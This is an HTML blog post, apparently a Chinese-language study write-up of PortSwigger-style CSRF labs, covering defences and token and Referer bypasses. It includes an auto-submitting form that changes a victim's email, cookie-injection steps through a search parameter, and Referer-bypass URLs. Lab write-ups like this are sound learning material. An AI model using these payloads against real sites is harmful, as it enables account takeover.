@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.3/css/all.min.css" integrity="sha256-2H3fkXt6FEmrReK448mDVGKb3WW2ZZw35gI7vqHOE4Y=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"h01iday.github.io","root":"/","images":"/images","scheme":"Muse","version":"8.7.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
+<meta name="description" content="#01 What is CSRF?Cross-site request forgery (also known as CSRF) is a web security  vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.  #02 Ho">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://h01iday.github.io/2021/10/23/CSRF/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="#01 What is CSRF?Cross-site request forgery (also known as CSRF) is a web security  vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.  #02 Ho">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/csrf1.png">
+<meta property="og:image" content="d:/blog/H01iday/source/_posts/pics/csrf2.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf3.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf4.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf5.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf6.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf7.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf8.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf9.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf10.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf11.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf12.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf13.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf15.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf16.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf17.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf18.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf19.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf21.png">
+<meta property="og:image" content="d:/blog/H01iday/source_posts/pics/csrf20.png">
+<meta property="article:published_time" content="2021-10-23T05:19:25.103Z">
+<meta property="article:modified_time" content="2021-10-25T12:51:32.661Z">
+<meta property="article:author" content="H01iday">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="d:/blog/H01iday/source/_posts/pics/csrf1.png">
+
+
+<link rel="canonical" href="https://h01iday.github.io/2021/10/23/CSRF/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"en","comments":true,"permalink":"https://h01iday.github.io/2021/10/23/CSRF/","path":"2021/10/23/CSRF/","title":""}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title> | Hexo</title>
+  
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Hexo</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#01-What-is-CSRF"><span class="nav-number">1.</span> <span class="nav-text">#01 What is CSRF?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#02-How-does-CSRF-work"><span class="nav-number">2.</span> <span class="nav-text">#02 How does CSRF work?</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#03-%E4%BA%A7%E7%94%9FCSRF%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%9D%A1%E4%BB%B6"><span class="nav-number">3.</span> <span class="nav-text">#03 产生CSRF漏洞的条件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#04-Preventing-CSRF-attacks"><span class="nav-number">4.</span> <span class="nav-text">#04 Preventing CSRF attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001-SameSite-cookies"><span class="nav-number">4.1.</span> <span class="nav-text">##001 SameSite cookies</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-CSRF-tokens"><span class="nav-number">4.2.</span> <span class="nav-text">##002 CSRF tokens</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#05-Common-CSRF-vulnerabilities"><span class="nav-number">5.</span> <span class="nav-text">#05 Common CSRF vulnerabilities</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#001-Validation-of-CSRF-token-depends-on-request-method"><span class="nav-number">5.1.</span> <span class="nav-text">##001 Validation of CSRF token depends on request method</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001-%E4%BE%8B%E5%AD%90"><span class="nav-number">5.1.1.</span> <span class="nav-text">###001 例子</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#002-Validation-of-CSRF-token-depends-on-token-being-present"><span class="nav-number">5.2.</span> <span class="nav-text">##002 Validation of CSRF token depends on token being present</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#003-CSRF-token-is-not-tied-to-the-user-session"><span class="nav-number">5.3.</span> <span class="nav-text">##003 CSRF token is not tied to the user session</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#04-CSRF-token-is-tied-to-a-non-session-cookie"><span class="nav-number">5.4.</span> <span class="nav-text">##04 CSRF token is tied to a non-session cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001-%E4%BE%8B%E5%AD%90-1"><span class="nav-number">5.4.1.</span> <span class="nav-text">###001 例子</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#05-CSRF-where-token-is-duplicated-in-cookie"><span class="nav-number">5.5.</span> <span class="nav-text">##05 CSRF where token is duplicated in cookie</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001-%E4%BE%8B%E5%AD%90-2"><span class="nav-number">5.5.1.</span> <span class="nav-text">###001 例子</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#06-Referer-based-defenses-against-CSRF"><span class="nav-number">5.6.</span> <span class="nav-text">##06 Referer-based defenses against CSRF</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#001-Validation-of-Referer-depends-on-header-being-present"><span class="nav-number">5.6.1.</span> <span class="nav-text">###001 Validation of Referer depends on header being present</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#002-Validation-of-Referer-can-be-circumvented"><span class="nav-number">5.6.2.</span> <span class="nav-text">###002 Validation of Referer can be circumvented</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#001-%E4%BE%8B%E5%AD%90-3"><span class="nav-number">5.6.2.1.</span> <span class="nav-text">###001 例子</span></a></li></ol></li></ol></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-overview">
+            <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">H01iday</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">32</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+  </nav>
+</div>
+
+
+
+          </div>
+        </div>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://h01iday.github.io/2021/10/23/CSRF/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="H01iday">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hexo">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-10-23 13:19:25" itemprop="dateCreated datePublished" datetime="2021-10-23T13:19:25+08:00">2021-10-23</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2021-10-25 20:51:32" itemprop="dateModified" datetime="2021-10-25T20:51:32+08:00">2021-10-25</time>
+      </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <h2 id="01-What-is-CSRF"><a href="#01-What-is-CSRF" class="headerlink" title="#01 What is CSRF?"></a>#01 What is CSRF?</h2><p>Cross-site request forgery (also known as CSRF) is a web security  vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform. </p>
+<h2 id="02-How-does-CSRF-work"><a href="#02-How-does-CSRF-work" class="headerlink" title="#02 How does CSRF work?"></a>#02 How does CSRF work?</h2><p>​            If a victim user visits the attacker’s web page, the following will happen:        </p>
+<ul>
+<li><p> The attacker’s page will trigger an HTTP request to the vulnerable web site.            </p>
+</li>
+<li><p> If the user is logged in to the vulnerable web site,  their browser will automatically include their session cookie in the  request (assuming SameSite cookies are not being used).            </p>
+</li>
+<li><p>The vulnerable web site will process the request in the  normal way, treat it as having been made by the victim user, and change  their email address.            </p>
+</li>
+</ul>
+<h2 id="03-产生CSRF漏洞的条件"><a href="#03-产生CSRF漏洞的条件" class="headerlink" title="#03 产生CSRF漏洞的条件"></a>#03 产生CSRF漏洞的条件</h2><blockquote>
+<p>1.被害用户已经完成身份认证 【session Cookie还在有效时间范围内】</p>
+<p>2.新请求的提交不需要重新身份认证或确认机制 【即有Cookie可以直接通过验证，不需要client的其它如滑块确认登录、验证码等方式来完成验证】</p>
+<p>3.攻击者必须了解Web APP请求的参数构造【post表单如何构造】</p>
+<p>4.引诱用户触发攻击的指令（社工）</p>
+</blockquote>
+<h2 id="04-Preventing-CSRF-attacks"><a href="#04-Preventing-CSRF-attacks" class="headerlink" title="#04 Preventing CSRF attacks"></a>#04 Preventing CSRF attacks</h2><h3 id="001-SameSite-cookies"><a href="#001-SameSite-cookies" class="headerlink" title="##001 SameSite cookies"></a>##001 SameSite cookies</h3><ul>
+<li>The <code>SameSite</code> attribute can be used to control whether and how cookies are submitted in cross-site requests.</li>
+<li> The <code>SameSite</code> attribute is added to the <code>Set-Cookie</code> response header when the server issues a cookie, and the attribute can be given two values, <code>Strict</code> or <code>Lax</code>. For example:        </li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Strict;        </span><br><span class="line">Set-Cookie: SessionId=sYMnfCUrAlmqVVZn9dqevxyFpKZt30NN; SameSite=Lax;      </span><br></pre></td></tr></table></figure>
+
+<p> <code>Strict</code>：the browser will not include the cookie in any requests that originate from another site. 【可能会影响用户体验，比如已登录用户不可以从第三方进入页面，必须重新登录】</p>
+<p> <code>Lax</code>默认： the browser will include the cookie in requests that originate from another site but only if two conditions are met:        </p>
+<ul>
+<li>The request uses the GET method. Requests with other methods, such as POST, will not include the cookie.            </li>
+<li>The request resulted from a top-level navigation by the  user, such as clicking a link. Other requests, such as those initiated  by scripts, will not include the cookie.            </li>
+</ul>
+<p>看似Lax模式也可以提供CSRF防御，一位内user actions that are targets for CSRF attacks are often implemented using the POST method. </p>
+<p>但是</p>
+<ul>
+<li>Some applications do implement sensitive actions using GET requests.            </li>
+<li>Many applications and frameworks are tolerant of  different HTTP methods. In this situation, even if the application  itself employs the POST method by design, it will in fact accept  requests that are switched to use the GET method.            </li>
+</ul>
+<h3 id="002-CSRF-tokens"><a href="#002-CSRF-tokens" class="headerlink" title="##002 CSRF tokens"></a>##002 CSRF tokens</h3><h2 id="05-Common-CSRF-vulnerabilities"><a href="#05-Common-CSRF-vulnerabilities" class="headerlink" title="#05 Common CSRF vulnerabilities"></a>#05 Common CSRF vulnerabilities</h2><h3 id="001-Validation-of-CSRF-token-depends-on-request-method"><a href="#001-Validation-of-CSRF-token-depends-on-request-method" class="headerlink" title="##001 Validation of CSRF token depends on request method"></a>##001 Validation of CSRF token depends on request method</h3><p>Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.        </p>
+<p>In this situation, the attacker can switch to the GET method to bypass the validation and deliver a CSRF attack</p>
+<h4 id="001-例子"><a href="#001-例子" class="headerlink" title="###001 例子"></a>###001 例子</h4><p>用POST方法，看到参数附带了CSRF-token</p>
+<img src="D:\blog\H01iday\source\_posts\pics\csrf1.png" alt="csrf1" style="zoom: 80%;" />
+
+<p>去掉csrf-token发送，得到400结果</p>
+<img src="D:\blog\H01iday\source\_posts\pics\csrf2.png" alt="csrf1" style="zoom: 80%;" />
+
+<p>右键–》change request method 【更改请求方式为GET】</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf3.png" alt="csrf1"></p>
+<p>发现请求成功，邮箱被成功修改</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf4.png" alt="csrf1"></p>
+<p>构造如下html表单，这里没有method是因为使用method的默认值get</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;https://ac1a1fd91e213dedc15b518a003b00a5.web-security-academy.net/my-account/change-email&quot;</span>&gt;</span></span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;email&quot;</span> <span class="attr">value</span>=<span class="string">&quot;hacker2333<span class="symbol">&amp;#64;</span>hack<span class="symbol">&amp;#46;</span>com&quot;</span>&gt;</span>//attacker想要修改为的邮箱</span><br><span class="line">         <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Submit Request&quot;</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">         <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();<span class="comment">//表单自动提交</span></span></span><br><span class="line"><span class="javascript">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>则用户只要进入该html页面就会自动发起修改请求提交。CSRF攻击成功</p>
+<h3 id="002-Validation-of-CSRF-token-depends-on-token-being-present"><a href="#002-Validation-of-CSRF-token-depends-on-token-being-present" class="headerlink" title="##002 Validation of CSRF token depends on token being present"></a>##002 Validation of CSRF token depends on token being present</h3><p>Some applications correctly validate the token when it is present but skip the validation if the token is omitted.        </p>
+<p>In this situation, the attacker can remove the entire parameter  containing the token (not just its value) to bypass the validation and  deliver a CSRF attack</p>
+<h3 id="003-CSRF-token-is-not-tied-to-the-user-session"><a href="#003-CSRF-token-is-not-tied-to-the-user-session" class="headerlink" title="##003 CSRF token is not tied to the user session"></a>##003 CSRF token is not tied to the user session</h3><p>Some applications do not validate that the token belongs to  the same session as the user who is making the request. Instead, the  application maintains a global pool of tokens that it has issued and  accepts any token that appears in this pool.        </p>
+<p>In this situation, the attacker can log in to the  application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.        </p>
+<h3 id="04-CSRF-token-is-tied-to-a-non-session-cookie"><a href="#04-CSRF-token-is-tied-to-a-non-session-cookie" class="headerlink" title="##04 CSRF token is tied to a non-session cookie"></a>##04 CSRF token is tied to a non-session cookie</h3><p>举个栗子说明</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/email/change</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF;      	</span><br><span class="line">        csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">csrf</span>=RhV<span class="number">7</span>yQDO<span class="number">0</span>xcq<span class="number">9</span>gLEah<span class="number">2</span>WVbmuFqyOq<span class="number">7</span>tY&amp;email=wiener@normal-user.com </span></span><br></pre></td></tr></table></figure>
+
+<p>这里的Cookie有两个值分别是session和csrfKey</p>
+<p>This can easily occur when an application employs two different  frameworks, one for session handling and one for CSRF protection, which  are not integrated together</p>
+<p>这里所说的 CSRF token is tied to a non-session cookie指的是CSRF token和csrfKey这个cookie绑定在一起。</p>
+<p>即用户A登录，用户A的session Cookie和其他用户的csrfKey-csrf对也可以登录用户A的账户。</p>
+<h4 id="001-例子-1"><a href="#001-例子-1" class="headerlink" title="###001 例子"></a>###001 例子</h4><p>已知：两个账户信息</p>
+<ul>
+<li><code>wiener:peter</code>            </li>
+<li> <code>carlos:montoya</code>     </li>
+</ul>
+<p> update-email存在CSRF漏洞</p>
+<p>登录winer用户</p>
+<p>①正常申请修改email请求头<img src="D:\blog\H01iday\source_posts\pics\csrf5.png" alt="csrf5"></p>
+<p>②修改session，被登出<img src="D:\blog\H01iday\source_posts\pics\csrf6.png" alt="csrf6"></p>
+<p>③修改csrfKey，不被登出，提示报错</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf7.png" alt="csrf8"></p>
+<p>从②③两步可以看出来</p>
+<p>==This suggests that the <code>csrfKey</code> cookie may not be strictly tied to the session.==                    </p>
+<p>④新建隐私窗口，登录另一个用户carlos获取其信息</p>
+<p>得到：</p>
+<p>csrfKey：PeyxE1Xd4XLU1LlpJqn07PIJgCHPcaNB</p>
+<p>csrf token：pmjh38ZJmA9jMYMdRmXuMpFGxQ2QtZKd</p>
+<p>⑤尝试用carlos的csrfKey放在wiener用户change-email的请求头</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf8.png" alt="csrf8"></p>
+<p>⑥尝试用carlos的csrfKey和csrf token都放在wiener用户change-email的请求头</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf9.png" alt="csrf8"></p>
+<p>⑤⑥两步说明 ：csrfKey和csrf token是绑定的；而这两个值和session不绑定。所以说，只要找一个改变wiener csrfKey的方法，再用前面的该改变csrf token 的方法，使得wiener访问访问attacker的恶意地址，自动附带上wiener的session cookie，则可以实现csrf攻击。</p>
+<p>⑦搜索栏进行搜索之后发现出现了一个新的cookie LastSearchTerm</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf10.png" alt="csrf10"></p>
+<p>⑧拦截一下看看http报文？</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf11.png" alt="csrf10"></p>
+<p>⑨尝试改写search后面的内容，看看能不能查看一个csrfKey的修改值</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf12.png" alt="csrf10"></p>
+<p>成功了！可以通过这个方法将cookie修改成attacker的csrfKey</p>
+<p>只要让用户访问这个地址【Host+/?search的内容】即可成功设置对应的cookie</p>
+<p>⑩巧妙地构造一个CSRF攻击</p>
+<p>CSRF token的值的设置和前面的实验一样。</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf13.png" alt="csrf10"></p>
+<h3 id="05-CSRF-where-token-is-duplicated-in-cookie"><a href="#05-CSRF-where-token-is-duplicated-in-cookie" class="headerlink" title="##05 CSRF where token is duplicated in cookie"></a>##05 CSRF where token is duplicated in cookie</h3><p>上例子</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/email/change</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>vulnerable-website.com</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>68</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa</span><br><span class="line"></span><br><span class="line"><span class="apache"><span class="attribute">csrf</span>=R<span class="number">8</span>ov<span class="number">2</span>YBfTYmzFyjit<span class="number">8</span>o<span class="number">2</span>hKBuoIjXXVpa&amp;email=wiener@normal-user.com </span></span><br></pre></td></tr></table></figure>
+
+<p>服务端是怎么验证CSRF token的正确性呢？在Cookie有csrf token；在POST处有csrf token；</p>
+<p>验证：the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie.查看post提交的csrf token和cookie头中的csrf token是否一致，如果一致则认证通过。</p>
+<p>【这种验证方法呢，服务器端是不会维护一个csrf token的，只要这两处的csrf token是一致的就算验证通过。 if the web site contains any cookie setting functionality，那么就可以实施CSRF攻击。下面的例子就是一个存在更改cookie的方法导致csrf漏洞的例子。这一例和上一例修改cookie的方法一致】</p>
+<h4 id="001-例子-2"><a href="#001-例子-2" class="headerlink" title="###001 例子"></a>###001 例子</h4><p>已知：wiener:peter</p>
+<p>​            update email功能存在csrf漏洞</p>
+<p>①先修改两个csrf token，看有没有格式要求，发现得到200，故没有格式要求</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf15.png" alt="csrf15"></p>
+<p>②跟上例一样，search得到一个新cookie<img src="D:\blog\H01iday\source_posts\pics\csrf16.png" alt="csrf16"></p>
+<p>③通过一样的方法修改cookie 中的csrf token</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf17.png" alt="csrf16"></p>
+<p>④在change email页面 右键 engagement tool–&gt;generate CSRF PoC</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf18.png" alt="csrf16"></p>
+<p>成功修改email！deliver exploit to victim即可</p>
+<h3 id="06-Referer-based-defenses-against-CSRF"><a href="#06-Referer-based-defenses-against-CSRF" class="headerlink" title="##06 Referer-based defenses against CSRF"></a>##06 Referer-based defenses against CSRF</h3><p>some applications make use of the HTTP <code>Referer</code> header to  attempt to defend against CSRF attacks, normally by verifying that the  request originated from the application’s own domain. </p>
+<p>即禁止从第三方跳转到application的页面</p>
+<h4 id="001-Validation-of-Referer-depends-on-header-being-present"><a href="#001-Validation-of-Referer-depends-on-header-being-present" class="headerlink" title="###001 Validation of Referer depends on header being present"></a>###001 Validation of Referer depends on header being present</h4><p>Some applications validate the <code>Referer</code> header when it is present in requests but skip the validation if the header is omitted.        </p>
+<p>这种情况下，可以直接防止浏览器发送referer信息</p>
+<p>方法：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;referrer&quot;</span> <span class="attr">content</span>=<span class="string">&quot;never&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="002-Validation-of-Referer-can-be-circumvented"><a href="#002-Validation-of-Referer-can-be-circumvented" class="headerlink" title="###002 Validation of Referer can be circumvented"></a>###002 Validation of Referer can be circumvented</h4><p>Some applications validate the <code>Referer</code> header in a naive way that can be bypassed.</p>
+<p>例如：</p>
+<p>①application检验referer以规定值开头，则可以将attack的domain作为application合法domain的subdomain</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://vulnerable-website.com.attacker-website.com/csrf-attack </span><br></pre></td></tr></table></figure>
+
+<p>②simply validates that the <code>Referer</code> contains its own domain name 则可以将application合法domain放在? #等地方来bypass</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://attacker-website.com/csrf-attack?vulnerable-website.com </span><br></pre></td></tr></table></figure>
+
+
+
+<p>In an attempt to reduce the risk of sensitive data being leaked in this way, many browsers now strip the query string from the <code>Referer</code> header by default.            </p>
+<p>解决：在http报文头部 添加 <code>Referrer-Policy: unsafe-url</code>，This ensures that the full URL will be sent, including the query string.            </p>
+<h5 id="001-例子-3"><a href="#001-例子-3" class="headerlink" title="###001 例子"></a>###001 例子</h5><p>已知: email change 存在CSRF漏洞</p>
+<p>​          wiener:peter登录</p>
+<p>①拦截 update email</p>
+<p>这是正常发送update请求的referer</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf19.png" alt="csrf19"></p>
+<p>这是在真正域名中间夹着”hack”,发现400</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf21.png" alt="csrf21"></p>
+<p>这是在真正域名前面加了“hack”发现能够得到正确response</p>
+<p><img src="D:\blog\H01iday\source_posts\pics\csrf20.png" alt="csrf20"></p>
